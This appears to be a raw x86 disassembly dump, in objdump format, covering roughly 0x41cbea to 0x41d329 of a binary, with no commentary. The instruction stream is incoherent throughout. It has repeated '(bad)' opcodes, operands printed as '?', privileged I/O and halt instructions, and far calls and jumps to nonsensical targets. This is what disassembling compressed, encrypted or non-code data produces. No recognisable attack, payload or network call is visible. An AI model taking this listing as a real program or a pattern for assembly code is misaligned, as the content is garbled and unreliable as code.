  41cbea:	sbb    DWORD PTR [eax-0x56],esp
  41cbed:	mov    dh,0x5d
  41cbef:	mov    ebp,0x3588b4e
  41cbf4:	xor    esp,DWORD PTR [ebx-0x15364e67]
  41cbfa:	mov    BYTE PTR [edi+eax*2-0x6c],dh
  41cbfe:	frstor [esi+0xb]
  41cc01:	gs push es
  41cc03:	test   ecx,0x2a37bc36
  41cc09:	mov    edi,0xccb2f7cb
  41cc0e:	hlt    
  41cc0f:	addr16 inc esi
  41cc11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc12:	and    al,0x25
  41cc14:	pop    ss
  41cc15:	mov    dh,0xdd
  41cc17:	ds ret 
  41cc19:	push   0x56
  41cc1b:	rol    eax,cl
  41cc1d:	jnp    0x41cbe5
  41cc1f:	dec    edi
  41cc20:	inc    esp
  41cc21:	stos   DWORD PTR es:[edi],eax
  41cc22:	dec    edi
  41cc23:	xlat   BYTE PTR ds:[ebx]
  41cc24:	add    eax,0xb7fe2867
  41cc29:	push   ds
  41cc2a:	aam    0xf9
  41cc2c:	popa   
  41cc2d:	inc    edi
  41cc2e:	mov    ?,esi
  41cc30:	xor    BYTE PTR [edi+0x52],bl
  41cc33:	call   0x1ee8:0x9da66e44
  41cc3a:	xlat   BYTE PTR ds:[ebx]
  41cc3b:	popa   
  41cc3c:	inc    edi
  41cc3d:	shr    DWORD PTR [ecx],cl
  41cc3f:	cmc    
  41cc40:	mov    esi,0x7062ce1e
  41cc45:	cmp    edi,ebx
  41cc47:	ror    DWORD PTR [ebx],1
  41cc49:	(bad)  
  41cc4a:	jg     0x41ccc9
  41cc4c:	xor    al,0xed
  41cc4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc4f:	mov    ah,0x36
  41cc51:	inc    eax
  41cc52:	data16 sub ch,BYTE PTR [edx-0x1e]
  41cc56:	pop    esi
  41cc57:	les    edx,FWORD PTR [esi-0x1aed5b0c]
  41cc5d:	push   eax
  41cc5e:	aad    0x3b
  41cc60:	call   FWORD PTR [ebp-0x48]
  41cc63:	inc    edi
  41cc64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc65:	stos   BYTE PTR es:[edi],al
  41cc66:	sti    
  41cc67:	jl     0x41cc9c
  41cc69:	push   ss
  41cc6a:	ins    BYTE PTR es:[edi],dx
  41cc6b:	pop    edi
  41cc6c:	repz ficom DWORD PTR [esi]
  41cc6f:	mov    al,ds:0x974103e7
  41cc74:	push   esi
  41cc75:	xor    al,0x80
  41cc77:	xchg   DWORD PTR [esi+esi*1-0x32aa2fd5],esp
  41cc7e:	jge    0x41cc7d
  41cc80:	int3   
  41cc81:	div    DWORD PTR [edx+0x3ef02dc]
  41cc87:	push   ecx
  41cc88:	add    BYTE PTR [edx-0x10],bh
  41cc8b:	sahf   
  41cc8c:	jl     0x41cca7
  41cc8e:	(bad)  
  41cc8f:	xor    al,0xd0
  41cc91:	lods   eax,DWORD PTR ds:[esi]
  41cc92:	cs mov ah,0x56
  41cc95:	jns    0x41cc6a
  41cc97:	add    al,0x31
  41cc99:	jns    0x41ccbe
  41cc9b:	dec    bx
  41cc9d:	(bad)  [edi-0x461576ad]
  41cca3:	dec    ecx
  41cca4:	shl    BYTE PTR [eax+0xc6e3c62],0x8b
  41ccab:	mov    gs,WORD PTR [ecx+0x4b]
  41ccae:	xor    bl,BYTE PTR [edi+0xce470de]
  41ccb4:	outs   dx,DWORD PTR ds:[esi]
  41ccb5:	pop    es
  41ccb6:	das    
  41ccb7:	pushf  
  41ccb8:	ins    DWORD PTR es:[edi],dx
  41ccb9:	xor    BYTE PTR [edx],al
  41ccbb:	cmp    BYTE PTR [ecx-0x6b],ah
  41ccbe:	mov    ebx,0x7309e5c2
  41ccc3:	(bad)  
  41ccc4:	fsub   st,st(0)
  41ccc6:	and    eax,0x9b036e28
  41cccb:	jae    0x41cd32
  41cccd:	mov    cl,0x3c
  41cccf:	cmp    ch,dh
  41ccd1:	clc    
  41ccd2:	cmp    BYTE PTR [ecx],dl
  41ccd4:	push   ecx
  41ccd5:	pop    es
  41ccd6:	pop    es
  41ccd7:	adc    al,0x39
  41ccd9:	sub    bl,al
  41ccdb:	mov    cl,0xa4
  41ccdd:	inc    DWORD PTR [eax+edx*8]
  41cce0:	in     al,dx
  41cce1:	sbb    dh,cl
  41cce3:	ror    BYTE PTR [ebp-0x2ac3cd46],1
  41cce9:	mov    bl,0x6
  41cceb:	arpl   dx,bp
  41cced:	xor    al,0xad
  41ccef:	and    DWORD PTR [ecx-0x429c08b7],0xffffff89
  41ccf6:	sub    ch,dh
  41ccf8:	jg     0x41cd10
  41ccfa:	cmp    dl,0x21
  41ccfd:	jno    0x41cd56
  41ccff:	iret   
  41cd00:	or     DWORD PTR [ebx],esi
  41cd02:	mov    esp,0x44f7dd01
  41cd07:	ss mov ebx,0x975488b5
  41cd0d:	sub    edi,DWORD PTR [ecx-0x6d]
  41cd10:	push   ebx
  41cd11:	xor    esp,DWORD PTR [edi]
  41cd13:	adc    DWORD PTR [ebp-0x35],0x55
  41cd17:	outs   dx,BYTE PTR ds:[esi]
  41cd18:	cmc    
  41cd19:	push   cs
  41cd1a:	mov    al,ds:0x7bd9111d
  41cd1f:	es fwait
  41cd21:	and    al,0x7f
  41cd23:	scas   al,BYTE PTR es:[edi]
  41cd24:	inc    esi
  41cd25:	mov    bl,0x3e
  41cd27:	sub    BYTE PTR [esi],0x81
  41cd2a:	dec    ecx
  41cd2b:	test   al,0xe1
  41cd2d:	and    ebx,DWORD PTR es:[ebp-0x5bc74b0b]
  41cd34:	sbb    DWORD PTR [edi-0xd648c04],esp
  41cd3a:	mov    ds:0x2a33df02,eax
  41cd3f:	gs fwait
  41cd41:	clc    
  41cd42:	xor    al,0xf4
  41cd44:	je     0x41cd84
  41cd46:	lods   al,BYTE PTR ds:[esi]
  41cd47:	(bad)  
  41cd48:	push   esp
  41cd49:	or     al,0x67
  41cd4b:	sbb    cl,cl
  41cd4d:	mov    ds:0xcffd50d3,al
  41cd52:	sbb    al,0x95
  41cd54:	xchg   ebp,eax
  41cd55:	dec    edi
  41cd56:	and    esp,DWORD PTR [esi]
  41cd58:	push   ss
  41cd59:	cwde   
  41cd5a:	xchg   ebx,eax
  41cd5b:	mul    BYTE PTR [edi-0x4]
  41cd5e:	test   BYTE PTR ds:0xcea7f41f,0x15
  41cd65:	xchg   edi,eax
  41cd66:	aam    0x9e
  41cd68:	in     eax,0x92
  41cd6a:	xor    eax,0x353f3026
  41cd6f:	loope  0x41cdd9
  41cd71:	mov    ch,0xa8
  41cd73:	mov    dl,0xe3
  41cd75:	(bad)  
  41cd76:	pop    eax
  41cd77:	jbe    0x41cda4
  41cd79:	xor    al,0xcd
  41cd7b:	test   eax,0x3a8abff0
  41cd80:	ror    BYTE PTR ds:0xf501ab23,0xa2
  41cd87:	push   esp
  41cd88:	sbb    esp,DWORD PTR [eax+0x48d06d6c]
  41cd8e:	jge    0x41cddd
  41cd90:	mov    ah,0x4b
  41cd92:	add    ebp,DWORD PTR [esi+0x1a]
  41cd95:	push   eax
  41cd96:	mov    ecx,DWORD PTR [edx]
  41cd98:	inc    eax
  41cd99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd9a:	dec    eax
  41cd9b:	leave  
  41cd9c:	call   0x8275:0x8f307e83
  41cda3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cda4:	mov    al,0x41
  41cda6:	sbb    dl,BYTE PTR [edx+ecx*4]
  41cda9:	outs   dx,BYTE PTR ds:[esi]
  41cdaa:	cmp    cl,al
  41cdac:	sbb    dh,0xb
  41cdaf:	mul    DWORD PTR ss:[esi-0x62]
  41cdb3:	pop    ebx
  41cdb4:	fimul  WORD PTR [eax-0xd0f290f]
  41cdba:	cdq    
  41cdbb:	cdq    
  41cdbc:	inc    edi
  41cdbd:	rol    BYTE PTR ds:0x3bd772a2,1
  41cdc3:	or     dh,BYTE PTR [ebx]
  41cdc5:	(bad)  
  41cdc7:	pop    es
  41cdc8:	jmp    0x32fc1480
  41cdcd:	ins    DWORD PTR es:[edi],dx
  41cdce:	repnz retf 
  41cdd0:	mov    ah,ah
  41cdd2:	mov    ?,WORD PTR [esi]
  41cdd4:	adc    bh,bh
  41cdd6:	inc    esp
  41cdd7:	ficom  WORD PTR [ebp*4+0x610588c7]
  41cdde:	fnstsw WORD PTR [eax-0x2a032fdc]
  41cde4:	mov    ebp,DWORD PTR [eax+0x4e]
  41cde7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cde8:	outs   dx,BYTE PTR ds:[esi]
  41cde9:	dec    edi
  41cdea:	je     0x41ce17
  41cdec:	sbb    ebx,DWORD PTR [esi-0x40]
  41cdef:	xchg   ebp,eax
  41cdf0:	dec    edi
  41cdf1:	es out 0x18,eax
  41cdf4:	lahf   
  41cdf5:	into   
  41cdf6:	jne    0x41ce12
  41cdf8:	push   ebp
  41cdf9:	ins    BYTE PTR es:[edi],dx
  41cdfa:	pop    edx
  41cdfb:	cmp    cl,BYTE PTR [ebx+0x30]
  41cdfe:	or     eax,0x5df90d7d
  41ce03:	add    DWORD PTR [ebx-0x79],ebp
  41ce06:	enter  0xf046,0xf3
  41ce0a:	outs   dx,DWORD PTR ds:[esi]
  41ce0b:	popa   
  41ce0c:	test   DWORD PTR [edi-0x8],ecx
  41ce0f:	or     ah,al
  41ce11:	pop    ebx
  41ce12:	cdq    
  41ce13:	neg    dh
  41ce15:	lock cmp bh,BYTE PTR [ecx+0x4b]
  41ce19:	popa   
  41ce1a:	jno    0x41cddf
  41ce1c:	pop    esi
  41ce1d:	lahf   
  41ce1e:	sbb    esi,0x28
  41ce21:	fcomip st,st(6)
  41ce23:	pop    edx
  41ce24:	lea    ebp,ds:0xfb7f0ee1
  41ce2a:	lods   eax,DWORD PTR ds:[esi]
  41ce2b:	pop    edx
  41ce2c:	jmp    0xbf403f13
  41ce31:	lds    ebp,FWORD PTR [ecx-0x37c7420b]
  41ce37:	mov    ecx,0x889907f0
  41ce3c:	test   DWORD PTR [ebp+0x1e],ebx
  41ce3f:	sub    ecx,DWORD PTR [ebp+eax*8-0x10]
  41ce43:	mov    DWORD PTR [ebp-0x2c],ebp
  41ce46:	inc    esi
  41ce47:	xchg   esi,eax
  41ce48:	dec    esp
  41ce49:	adc    esp,esi
  41ce4b:	add    DWORD PTR [edi-0x45e9b71a],ebp
  41ce51:	xchg   DWORD PTR [edx],ebx
  41ce53:	adc    eax,DWORD PTR [ecx]
  41ce55:	push   0xffffffa4
  41ce57:	in     eax,0x7a
  41ce59:	pop    ds
  41ce5a:	pop    eax
  41ce5b:	and    eax,0x49ca3f6
  41ce60:	hlt    
  41ce61:	jae    0x41ce0a
  41ce63:	or     ebx,DWORD PTR [edi]
  41ce65:	mov    bl,BYTE PTR [esi+edx*4+0x5d02f1b8]
  41ce6c:	inc    ebp
  41ce6d:	mov    ecx,0xcf1e6451
  41ce72:	mov    ss,eax
  41ce74:	fcom   QWORD PTR [ebx+0x19]
  41ce77:	jns    0x41cea5
  41ce79:	xor    al,0x5b
  41ce7b:	pop    ss
  41ce7c:	ds mov ecx,0x1daf277
  41ce82:	sub    BYTE PTR [ebp+0x79],al
  41ce85:	push   0xfc102363
  41ce8a:	repz sbb al,BYTE PTR [bx+si]
  41ce8e:	jge    0x41ce74
  41ce90:	xchg   DWORD PTR [edx-0x5db76b8],edx
  41ce96:	sahf   
  41ce97:	(bad)  
  41ce99:	and    cl,BYTE PTR [edx-0x1e]
  41ce9c:	iret   
  41ce9d:	mov    ds:0x6b0660df,al
  41cea2:	mov    eax,ds:0x1abf2446
  41cea7:	inc    ecx
  41cea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cea9:	mov    ebp,0x273d5059
  41ceae:	push   esi
  41ceaf:	push   ds
  41ceb0:	mov    bl,0xad
  41ceb2:	xchg   edx,eax
  41ceb3:	das    
  41ceb4:	pop    ds
  41ceb5:	sbb    DWORD PTR [ebx-0x70],edi
  41ceb8:	pop    edi
  41ceb9:	adc    BYTE PTR [ecx+ebp*1],al
  41cebc:	call   0x9c5d:0x7fedcf07
  41cec3:	add    eax,0xc1b8fb1c
  41cec8:	mov    ch,0x5
  41ceca:	rcl    DWORD PTR [eax+0x1b],0x19
  41cece:	mov    edi,0x83c74d14
  41ced3:	fwait
  41ced4:	inc    edx
  41ced5:	outs   dx,DWORD PTR ds:[esi]
  41ced6:	jl     0x41ceaa
  41ced8:	xchg   DWORD PTR [ebx+0x72a57e9b],ebx
  41cede:	sbb    bh,BYTE PTR [edi]
  41cee0:	retf   0x8742
  41cee3:	adc    DWORD PTR [edx-0x788ca465],eax
  41cee9:	std    
  41ceea:	add    DWORD PTR [edx],esi
  41ceec:	int3   
  41ceed:	jl     0x41cec1
  41ceef:	lock aam 0xb4
  41cef2:	xor    eax,0x6ed8468b
  41cef7:	fcomp  QWORD PTR [eax+0x6e42b81e]
  41cefd:	adc    eax,0x6b3efe5
  41cf02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf03:	dec    edi
  41cf04:	das    
  41cf05:	(bad)  
  41cf06:	jmp    0x41cebc
  41cf08:	loop   0x41cefc
  41cf0a:	push   0x2581207f
  41cf0f:	jge    0x41cecb
  41cf11:	mov    edi,0x66d101d8
  41cf16:	mov    ecx,0x84bafe4c
  41cf1b:	and    BYTE PTR [ebx],cl
  41cf1d:	loop   0x41cede
  41cf1f:	adc    BYTE PTR [ebx-0x35],dl
  41cf22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf23:	cmp    DWORD PTR [ecx-0x54],edi
  41cf26:	sbb    ebx,ecx
  41cf28:	mov    WORD PTR [edi],ss
  41cf2a:	mov    ds:0x6758ff8c,al
  41cf2f:	scas   al,BYTE PTR es:[edi]
  41cf30:	int3   
  41cf31:	sub    DWORD PTR [edi],0x96884d86
  41cf37:	and    edx,DWORD PTR [ecx]
  41cf39:	add    BYTE PTR [ebx],bl
  41cf3b:	loop   0x41cecb
  41cf3d:	add    bh,BYTE PTR [eax]
  41cf3f:	sub    al,0x27
  41cf41:	test   eax,0xcb2a6b0a
  41cf46:	ror    ebp,cl
  41cf48:	push   ebp
  41cf49:	push   es
  41cf4a:	push   ebp
  41cf4b:	retf   
  41cf4c:	clc    
  41cf4d:	nop
  41cf4e:	inc    eax
  41cf4f:	popf   
  41cf50:	mov    esp,DWORD PTR [edi]
  41cf52:	ins    BYTE PTR es:[edi],dx
  41cf53:	(bad)
  41cf57:	loope  0x41ceeb
  41cf59:	imul   edx,esi,0x49
  41cf5c:	fstp   TBYTE PTR [bx+si]
  41cf5f:	pop    ebx
  41cf60:	mov    edx,0x2f1c286b
  41cf65:	push   eax
  41cf66:	icebp  
  41cf67:	fdiv   QWORD PTR [ecx-0x4e69c2cc]
  41cf6d:	dec    ebx
  41cf6e:	retf   0x71c5
  41cf71:	inc    edx
  41cf72:	mov    ?,WORD PTR [ebp-0x61df2a09]
  41cf78:	cmp    eax,0x38179274
  41cf7d:	or     DWORD PTR [esi-0x7aae2d6b],edi
  41cf83:	sbb    BYTE PTR [ecx+edi*4-0x58f666f3],0xd9
  41cf8b:	add    cl,BYTE PTR [edi]
  41cf8d:	cmp    edi,DWORD PTR [eax-0x2a2cb2c7]
  41cf93:	mov    WORD PTR [ebp+0x4a0d3dd8],fs
  41cf99:	fld    QWORD PTR ds:0xd1e0057b
  41cf9f:	cs and al,0x82
  41cfa2:	fistp  WORD PTR [ebp-0x43c7444b]
  41cfa8:	out    0x7,eax
  41cfaa:	cmp    al,0xb8
  41cfac:	sahf   
  41cfad:	popf   
  41cfae:	sti    
  41cfaf:	(bad)  
  41cfb0:	into   
  41cfb1:	pop    ebp
  41cfb2:	(bad)  
  41cfb4:	shr    DWORD PTR [esi-0x4b0c2ff1],0x26
  41cfbb:	les    esi,FWORD PTR [edi]
  41cfbd:	xor    edi,ecx
  41cfbf:	mov    DWORD PTR [edi-0x5b],eax
  41cfc2:	push   ds
  41cfc3:	pop    ss
  41cfc4:	mov    ds:0xae0b7047,al
  41cfc9:	add    dl,bh
  41cfcb:	aad    0xfa
  41cfcd:	std    
  41cfce:	loope  0x41cf52
  41cfd0:	rcr    DWORD PTR [esi],cl
  41cfd2:	or     al,0xaa
  41cfd4:	inc    ebx
  41cfd5:	jmp    0x5ec242b6
  41cfda:	sbb    al,0xa9
  41cfdc:	mov    ebx,DWORD PTR [edx]
  41cfde:	int    0xb8
  41cfe0:	mov    eax,ds:0x9b4f7702
  41cfe5:	sub    esi,ebp
  41cfe7:	int    0x54
  41cfe9:	scas   eax,DWORD PTR es:[edi]
  41cfea:	out    dx,al
  41cfeb:	sahf   
  41cfec:	repz add bl,BYTE PTR gs:[ecx-0x74]
  41cff1:	dec    edx
  41cff2:	inc    esi
  41cff3:	nop
  41cff4:	or     esp,DWORD PTR [edx+ebx*4-0x1ad02b47]
  41cffb:	shl    BYTE PTR [eax+0x1d17d090],1
  41d001:	neg    DWORD PTR [eax]
  41d003:	(bad)  
  41d004:	in     al,dx
  41d005:	push   ds
  41d006:	mov    ecx,0x5aacc8b4
  41d00b:	push   ebx
  41d00c:	sub    BYTE PTR [esi+0x7],dh
  41d00f:	pop    ebx
  41d010:	jl     0x41d049
  41d012:	fld    QWORD PTR [ecx+ebp*1+0x8]
  41d016:	lea    ebx,[esi+0x62]
  41d019:	jmp    0x917152a1
  41d01e:	(bad)  
  41d01f:	sub    DWORD PTR [ebp-0x308c2dda],edx
  41d025:	in     al,0x36
  41d027:	ror    BYTE PTR [ebp+0x53eda459],1
  41d02d:	repz mov esi,0xdc29d9f9
  41d033:	mov    ds:0x7d3ac1db,eax
  41d038:	inc    edi
  41d039:	mov    eax,ds:0x125ae8e4
  41d03e:	cmc    
  41d03f:	and    esp,DWORD PTR [edx+0x20]
  41d042:	push   ecx
  41d043:	add    al,0x91
  41d045:	sbb    eax,0xc66021ff
  41d04a:	addr16 pop ebx
  41d04c:	sbb    eax,0xd18743ad
  41d051:	pop    edx
  41d052:	adc    eax,0x873cf776
  41d057:	icebp  
  41d058:	iret   
  41d059:	lods   al,BYTE PTR ds:[esi]
  41d05a:	xor    eax,DWORD PTR [esi]
  41d05c:	xchg   ebp,ebx
  41d05e:	push   ebp
  41d05f:	(bad)  
  41d060:	pop    ebp
  41d061:	(bad)  
  41d062:	cld    
  41d063:	cmp    DWORD PTR [edx+eax*1],0xd000f371
  41d06a:	adc    BYTE PTR ds:0x45b5b097,cl
  41d070:	mov    eax,ds:0x12e1be41
  41d075:	dec    ebx
  41d076:	xchg   ebp,eax
  41d077:	js     0x41d03b
  41d079:	push   edi
  41d07a:	sbb    eax,0xb709ddb9
  41d07f:	stos   BYTE PTR es:[edi],al
  41d080:	arpl   WORD PTR [edi+0x77],bp
  41d083:	call   ebp
  41d085:	bound  esi,QWORD PTR [ebp-0x58]
  41d088:	mov    eax,0x6c1a0fe8
  41d08d:	aaa    
  41d08e:	lds    esp,FWORD PTR [ecx-0x4f779cce]
  41d094:	les    edi,FWORD PTR [ebp-0x151a2f82]
  41d09a:	test   al,dl
  41d09c:	test   BYTE PTR [ebx],bl
  41d09e:	add    BYTE PTR [esi-0x15],dh
  41d0a1:	pop    es
  41d0a2:	mov    dl,0x98
  41d0a4:	fwait
  41d0a5:	sbb    dl,BYTE PTR [ebx-0x23f8c4d4]
  41d0ab:	sub    al,0x18
  41d0ad:	fstp   DWORD PTR [edx-0x52]
  41d0b0:	pop    ecx
  41d0b1:	xlat   BYTE PTR ds:[ebx]
  41d0b2:	add    BYTE PTR [eax+0x60179d9e],ch
  41d0b8:	jl     0x41d134
  41d0ba:	mov    esp,0x457a231f
  41d0bf:	es inc ebp
  41d0c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0c2:	or     al,0x74
  41d0c4:	or     dh,BYTE PTR [esi]
  41d0c6:	mov    ds:0xf97b94df,al
  41d0cb:	mov    edi,0x3fc19ef4
  41d0d0:	add    al,0x19
  41d0d2:	mov    edi,0x49e81a7d
  41d0d7:	jl     0x41d0d2
  41d0d9:	aas    
  41d0da:	cmp    DWORD PTR [eax],esi
  41d0dc:	nop
  41d0dd:	xor    DWORD PTR [eax],ebx
  41d0df:	or     ebx,DWORD PTR [edi+0x24]
  41d0e2:	push   ss
  41d0e3:	pop    edi
  41d0e4:	jmp    0xbafa:0x7b931be0
  41d0eb:	xchg   ebx,eax
  41d0ec:	and    BYTE PTR [edx+eax*1+0x7e613d5],ch
  41d0f3:	test   DWORD PTR [ebx-0x20e3f290],0x73c372b9
  41d0fd:	xchg   edi,eax
  41d0fe:	mov    edx,0x36dab5c3
  41d103:	std    
  41d104:	mov    ch,0x4
  41d106:	daa    
  41d107:	add    eax,ecx
  41d109:	in     al,dx
  41d10a:	fidivr WORD PTR [ecx+ecx*4]
  41d10d:	in     al,dx
  41d10e:	pop    ds
  41d10f:	rol    DWORD PTR ss:[ebx+0x63],1
  41d113:	mov    dh,0xbf
  41d115:	aaa    
  41d116:	aas    
  41d117:	push   ss
  41d118:	loope  0x41d18b
  41d11a:	fcomip st,st(5)
  41d11c:	sbb    BYTE PTR [ebx+ebx*4+0xf57226e],al
  41d123:	and    ecx,DWORD PTR [edi-0x79]
  41d126:	jne    0x41d1a5
  41d128:	lds    eax,FWORD PTR [ebx]
  41d12a:	arpl   si,bx
  41d12c:	ret    
  41d12d:	and    eax,0x5ecead9a
  41d132:	arpl   sp,dx
  41d134:	retf   0x124
  41d137:	dec    eax
  41d138:	loop   0x41d192
  41d13a:	in     al,dx
  41d13b:	in     eax,dx
  41d13c:	inc    edi
  41d13d:	or     DWORD PTR [edx-0x7d],edx
  41d140:	cld    
  41d141:	push   0xfd8ef3c9
  41d146:	xor    DWORD PTR [edi+ecx*1],esi
  41d149:	adc    eax,DWORD PTR [esi]
  41d14b:	shl    DWORD PTR [esi+0x25968e80],1
  41d151:	fmul   st(3),st
  41d153:	dec    esi
  41d154:	gs aaa 
  41d156:	cmp    esi,DWORD PTR [ecx]
  41d158:	push   ebp
  41d159:	sub    DWORD PTR [edi+0x21],esi
  41d15c:	aaa    
  41d15d:	pop    ds
  41d15e:	js     0x41d107
  41d160:	xlat   BYTE PTR ds:[ebx]
  41d161:	xlat   BYTE PTR ds:[ebx]
  41d162:	mov    bl,0xf1
  41d164:	pop    ecx
  41d165:	push   ebx
  41d166:	cmp    bh,BYTE PTR [ebp+0x58]
  41d169:	arpl   bp,bp
  41d16b:	dec    esi
  41d16c:	or     eax,0xb37a5878
  41d171:	cmp    DWORD PTR [edi+0x2d122bec],0x3a8b81f3
  41d17b:	xchg   BYTE PTR [esi+0x7a6304a7],cl
  41d181:	mov    ds:0x185d14f0,eax
  41d186:	idiv   DWORD PTR [eax+0x28]
  41d189:	retf   
  41d18a:	dec    edx
  41d18b:	arpl   WORD PTR [edi-0x5b],di
  41d18e:	addr16 xor eax,0x5d388d7d
  41d194:	jae    0x41d151
  41d196:	and    DWORD PTR ds:0x2ab927be,edi
  41d19c:	mov    bl,0xbb
  41d19e:	es xchg eax,esi
  41d1a1:	out    0xb5,eax
  41d1a3:	pop    cx
  41d1a5:	xchg   edi,eax
  41d1a6:	xor    bh,BYTE PTR [ecx]
  41d1a8:	cmp    al,0x2c
  41d1aa:	stc    
  41d1ab:	stos   DWORD PTR es:[edi],eax
  41d1ac:	inc    eax
  41d1ad:	xor    DWORD PTR [ecx],ebp
  41d1af:	test   eax,0x95b6ac5a
  41d1b4:	push   esi
  41d1b5:	inc    ecx
  41d1b6:	fiadd  WORD PTR [ecx-0x52f8f1e9]
  41d1bc:	lods   eax,DWORD PTR ds:[esi]
  41d1bd:	outs   dx,BYTE PTR ds:[esi]
  41d1be:	imul   ebx,ebx,0x5f
  41d1c1:	bound  esp,QWORD PTR [ebx-0x2cfaf341]
  41d1c7:	test   DWORD PTR [esi+0x12],eax
  41d1ca:	mov    esi,0x6cd83eea
  41d1cf:	jo     0x41d169
  41d1d1:	pop    ebx
  41d1d2:	jmp    0xfcb666d6
  41d1d7:	mov    dh,0x79
  41d1d9:	pop    esp
  41d1da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1db:	cmc    
  41d1dc:	inc    edx
  41d1dd:	adc    BYTE PTR ds:0xda0da2ea,dh
  41d1e3:	ja     0x41d167
  41d1e5:	repz xchg esi,eax
  41d1e7:	aad    0x24
  41d1e9:	mov    eax,ds:0x11031427
  41d1ee:	ins    BYTE PTR es:[edi],dx
  41d1ef:	(bad)  
  41d1f0:	out    0x28,eax
  41d1f2:	xchg   ecx,eax
  41d1f3:	test   ch,bl
  41d1f5:	sbb    al,0xdc
  41d1f7:	adc    dh,cl
  41d1f9:	fcomp  QWORD PTR [edi+edx*2+0x3d]
  41d1fd:	ss iret 
  41d1ff:	sahf   
  41d200:	fs loopne 0x41d21e
  41d203:	fcomp  DWORD PTR [ecx-0x73fb4d81]
  41d209:	bound  edi,QWORD PTR [ebx-0x51b2124]
  41d20f:	sub    DWORD PTR [edi+edx*1],esp
  41d212:	ret    
  41d213:	mov    eax,ds:0x6e56d6e2
  41d218:	fisttp DWORD PTR cs:[bx+si]
  41d21c:	fwait
  41d21d:	inc    esp
  41d21e:	xchg   edi,eax
  41d21f:	popf   
  41d220:	enter  0x8f77,0x72
  41d224:	aam    0xd6
  41d226:	loop   0x41d1cc
  41d228:	jp     0x41d27e
  41d22a:	stos   BYTE PTR es:[edi],al
  41d22b:	xor    ebx,0x62
  41d22e:	das    
  41d22f:	inc    esi
  41d230:	addr16 inc ebp
  41d232:	xchg   ebx,eax
  41d233:	lods   eax,DWORD PTR ds:[esi]
  41d234:	xor    eax,0x2dbacb33
  41d239:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d23a:	lahf   
  41d23b:	jbe    0x41d2b9
  41d23d:	mov    BYTE PTR [eax-0xa63b613],bl
  41d243:	mov    ebx,0x93e5d86d
  41d248:	xor    BYTE PTR [esi],ah
  41d24a:	data16 arpl WORD PTR [eax],ax
  41d24d:	adc    DWORD PTR [edx-0x348e559d],esp
  41d253:	(bad)  
  41d254:	push   ecx
  41d255:	dec    edx
  41d256:	cmp    dl,cl
  41d258:	inc    esp
  41d259:	ret    0xd397
  41d25c:	sahf   
  41d25d:	inc    ecx
  41d25e:	dec    edi
  41d25f:	out    0xd3,ax
  41d262:	ins    BYTE PTR es:[edi],dx
  41d263:	adc    BYTE PTR [ecx+0x77137fd8],0xb0
  41d26a:	outs   dx,DWORD PTR ds:[esi]
  41d26b:	cmp    eax,0x6d2a9470
  41d270:	add    eax,0x2b46b85c
  41d275:	rcr    DWORD PTR [edx],0xf7
  41d278:	(bad)  
  41d279:	fwait
  41d27a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d27b:	retf   0x4412
  41d27e:	aad    0xe4
  41d280:	sahf   
  41d281:	jecxz  0x41d2da
  41d283:	cmp    BYTE PTR [edx-0x797aed28],0x40
  41d28a:	outs   dx,BYTE PTR ds:[esi]
  41d28b:	fdivr  DWORD PTR [esi+edx*1-0x3b]
  41d28f:	sbb    al,0xb6
  41d291:	aam    0xd9
  41d293:	sbb    dl,BYTE PTR [edx+0x6824e01c]
  41d299:	mov    edx,0xb419508a
  41d29e:	cli    
  41d29f:	cmp    bh,BYTE PTR [esi]
  41d2a1:	jecxz  0x41d2bb
  41d2a3:	popa   
  41d2a4:	test   ah,ch
  41d2a6:	push   esi
  41d2a7:	lods   eax,DWORD PTR ds:[esi]
  41d2a8:	and    DWORD PTR ss:[edi+0x64c6e2a8],0xd0b69e92
  41d2b3:	test   al,0x90
  41d2b5:	mov    bh,0x5
  41d2b7:	mov    esi,0x5418710e
  41d2bc:	mov    al,ds:0xbad44c05
  41d2c1:	shl    DWORD PTR [ebx],0xd4
  41d2c4:	add    DWORD PTR [ecx+eiz*1],0x1b
  41d2c8:	and    ebx,DWORD PTR [ebx-0x53]
  41d2cb:	sbb    esi,DWORD PTR [ebp+edi*2-0x6f]
  41d2cf:	xor    ebp,DWORD PTR [ebx]
  41d2d1:	pusha  
  41d2d2:	push   ss
  41d2d3:	(bad)  
  41d2d4:	shl    BYTE PTR [ecx],cl
  41d2d6:	and    eax,0xe2e5d0d
  41d2db:	std    
  41d2dc:	std    
  41d2dd:	clc    
  41d2de:	nop
  41d2df:	mov    ds:0x66151da1,al
  41d2e4:	aas    
  41d2e5:	cli    
  41d2e6:	clc    
  41d2e7:	bound  esi,QWORD PTR [edx-0x20447687]
  41d2ed:	popf   
  41d2ee:	push   0xfffffff9
  41d2f0:	lods   al,BYTE PTR ds:[esi]
  41d2f1:	stc    
  41d2f2:	pop    esp
  41d2f3:	js     0x41d326
  41d2f5:	lock std 
  41d2f7:	scas   eax,DWORD PTR es:[edi]
  41d2f8:	or     bh,bh
  41d2fa:	push   edi
  41d2fb:	pop    bx
  41d2fd:	adc    eax,0x5aec9ebe
  41d302:	aam    0x3e
  41d304:	mov    esp,0xa77db889
  41d309:	inc    esp
  41d30a:	and    BYTE PTR [edx],al
  41d30c:	bound  ebp,QWORD PTR [ebx]
  41d30e:	jp     0x41d372
  41d310:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d311:	push   0xa06a9fe
  41d316:	xchg   esp,eax
  41d317:	fbld   TBYTE PTR [edi-0x20]
  41d31a:	jae    0x41d2ed
  41d31c:	dec    esi
  41d31d:	jne    0x41d2de
  41d31f:	add    DWORD PTR [ebx],edi
  41d321:	push   cs
  41d322:	xchg   ebx,eax
  41d323:	inc    ebp
  41d324:	cld    
  41d325:	repnz dec eax
  41d327:	jo     0x41d32d
  41d329:	ret    
